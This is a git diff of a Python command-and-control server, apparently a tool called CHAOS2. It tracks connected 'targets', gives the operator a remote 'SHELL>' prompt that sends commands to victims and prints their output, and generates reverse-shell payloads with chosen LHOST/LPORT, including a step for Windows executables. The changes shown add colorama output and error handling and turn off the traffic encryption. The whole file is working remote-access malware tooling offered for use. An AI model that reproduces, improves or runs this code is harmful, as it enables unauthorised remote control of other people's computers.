@@ -4,7 +4,9 @@ import json
 import sys
 import os
 import signal
+import colorama
 from Crypto.Cipher import AES
+from colorama import Fore, Style
 
 
 conn_list={}
@@ -19,7 +21,7 @@ def encrypt(message):
 
 def decrypt(message):
     decrypto = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
-    return  decrypto.decrypt(message) 
+    return  decrypto.decrypt(message)
 
 
 def server():
@@ -37,12 +39,13 @@ def server():
         conn, addr = s.accept()
         mac=""
         if conn:
-            mac=decrypt(conn.recv(4098)).decode('utf-8')
+            #mac=decrypt(conn.recv(4098)).decode('utf-8')
+            mac=conn.recv(4098).decode('utf-8')
             if mac:
                 if mac in conn_list:
-                    print(bcolors.OKGREEN,"\n[*] Target Online:{}".format(mac))
+                    print(Fore.GREEN,"\n[*] Target Online:{}".format(mac),Style.RESET_ALL)
                 else:
-                    print(bcolors.OKBLUE,"\n[+] New Target Added:{}".format(mac))
+                    print(Fore.BLUE,"\n[+] New Target Added:{}".format(mac),Style.RESET_ALL)
                     conn_list[mac]=conn
 
 def client():
@@ -53,44 +56,49 @@ def client():
             count+=1
             print("{}) {}".format(count,key))
     else:
-        print(bcolors.FAIL,"\n[*] List is empty")
+        print(Fore.RED,"\n[*] List is empty",Style.RESET_ALL)
 
 
 
 def trigger():
-    global conn_list
-    interaction=int(input("[*] Interact with:-"))
-    if interaction:
-        if conn_list:
-            if interaction<=len(conn_list):
-                #print(conn_list)
-                console(conn_list[list(conn_list.keys())[interaction-1]],list(conn_list.keys())[interaction-1],list(conn_list.keys())[interaction-1])
+    try:
+        global conn_list
+        interaction=int(input("[*] Interact with:-"))
+        if interaction:
+            if conn_list:
+                if interaction<=len(conn_list):
+                    #print(conn_list)
+                    console(conn_list[list(conn_list.keys())[interaction-1]],list(conn_list.keys())[interaction-1],list(conn_list.keys())[interaction-1])
         else:
-            print(bcolors.FAIL,"\n[*] No connections")
+            print(Fore.RED,"\n[*] No connections",Style.RESET_ALL)
+    except socket.error:
+        print(Fore.RED,"\n[*] Lost connection!",Style.RESET_ALL)
 
 def console(conn,bot,socket_target):
-    print("\n====Target::({})====".format(bot))
+    print(Fore.GREEN,"\n====Target::({})====".format(bot), Style.RESET_ALL)
 
     while True:
-        commands=input("SHELL> ")
-        a={bot:commands}
-        if commands=='exit':
+        try:
+            commands=input("SHELL> ")
+            a={bot:commands}
+            if commands=='exit':
+                return 0
+            else:
+                commands = bytes(commands, 'utf-8')
+                conn.sendall(commands) # Otherwise we will send the command to the target
+                out=conn.recv(64000).decode('utf-8') # and print the result that we got back
+                #conn.sendall(encrypt(commands)) # Otherwise we will send the command to the target
+                #out=decrypt(conn.recv(64000)).decode('utf-8') # and print the result that we got back
+                print(out)
+
+        except socket.error:
+            print(Fore.RED,"====Host:{} went offline===".format(bot), Style.RESET_ALL)
+            del conn_list[socket_target]
             return 0
-        else:
-            commands = bytes(commands, 'utf-8')
-            conn.sendall(encrypt(commands)) # Otherwise we will send the command to the target
-            out=decrypt(conn.recv(64000)).decode('utf-8') # and print the result that we got back
-            print(out)
-           # if out=="Dead":
-            #    print(bcolors.FAIL,"====Host:{} went offline===".format(bot))
-            #    del conn_list[socket_target]
-            #    return 0
-            #else:
-                #print(out)
 
 
 def generatePayload():
-    print("[*] Let's generate payloads")
+    print(Fore.YELLOW,"[*] Let's generate payloads",Style.RESET_ALL)
 
     # Python payload already exists? delete that fucker
     if os.path.exists("generated/payload.py"):
@@ -98,10 +106,10 @@ def generatePayload():
     else:
         pass
     # Read from listener.py , and replace both port and host to those introduced by user, then append to payload.py
-    print("[!] Defaults to 127.0.0.1 - 443")
+    print(Fore.YELLOW,"[!] Defaults to 127.0.0.1 - 443",Style.RESET_ALL)
     lhost=input("LHOST> ") or "127.0.0.1"
     lport=input("LPORT> ") or "443"
-    # Read payload file, and replace host variable 
+    # Read payload file, and replace host variable
     f = open("utils/listener.py", "r")
     x = open("generated/payload.py", "w+")
     for line in f:
@@ -115,9 +123,15 @@ def generatePayload():
             else:
                 x.write(line)
     f.close()
+    print(Fore.YELLOW,"[*] Creating .exe payload for win targets . . .", Style.RESET_ALL)
+    #os.system("pyinstaller --onefile -w generated/payload.py")
+    # We need to compile using wine bruuuuhhhhh, :()
+    print(Fore.YELLOW,"[*] .exe created! Check dist folder!  . . .",Style.RESET_ALL)
+
+
 
 def bye():
-    print(bcolors.HEADER," \n[!] ooof bye :(")
+    print(Fore.YELLOW," \n[!] ooof bye :(",Style.RESET_ALL)
 
 
 def banner():
@@ -127,13 +141,13 @@ def banner():
     print("██║     ███████║███████║██║   ██║███████╗ █████╔╝")
     print("██║     ██╔══██║██╔══██║██║   ██║╚════██║██╔═══╝ ")
     print("╚██████╗██║  ██║██║  ██║╚██████╔╝███████║███████╗")
-    print(" ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝")                             
+    print(" ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝")
 
 def main():
     banner()
     threading.Thread(target=server).start()
-    print(bcolors.HEADER,"\n[*] Server Started - Listening on port: " + str(PORT))
-    print("[*] Type help or ? for options")
+    print(Fore.YELLOW,"\n[*] Server Started - Listening on port: " + str(PORT), Style.RESET_ALL)
+    print(Fore.YELLOW,"\n[*] Type help or ? for options", Style.RESET_ALL)
     while True:
         print(bcolors.ENDC)
         choice=input("CHAOS2> ")
@@ -152,12 +166,15 @@ def main():
             print("[+] interact or i \t\t\tinteract with a target")
             print("[+] payload or p \t\t\tgenerate payloads")
             print("==========")
+            print(bcolors.ENDC)
         elif choice =='payload' or choice =='p':
             generatePayload()
         else:
             pass
 
 
+# Alternative colors
+# print(bcolors.HEADER,"\
 class bcolors:
     HEADER = '\033[95m'
     OKBLUE = '\033[94m'
